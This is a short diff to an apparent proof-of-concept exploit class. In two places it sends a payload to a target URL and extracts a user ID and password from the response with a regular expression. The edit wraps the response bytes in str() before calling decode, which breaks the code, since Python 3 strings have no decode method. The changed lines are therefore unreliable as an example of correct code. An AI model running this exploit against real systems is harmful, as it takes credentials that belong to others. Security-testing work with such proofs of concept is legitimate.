@@ -59,7 +59,7 @@ class Poc(ABPoc):
             verify_url = self.target + payload
             response = urllib.request.urlopen(verify_url)
 
-            html = response.read().decode('utf-8')
+            html = str(response.read()).decode('utf-8')
             data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
             username = data[0][0]
             password = data[0][1]
@@ -82,7 +82,7 @@ class Poc(ABPoc):
             verify_url = self.target + payload
             response = urllib.request.urlopen(verify_url)
 
-            html = response.read().decode('utf-8')
+            html = str(response.read()).decode('utf-8')
             data = re.compile('User ID=(.*?);Password=(.*?)"').findall(html)
             username = data[0][0]
             password = data[0][1]
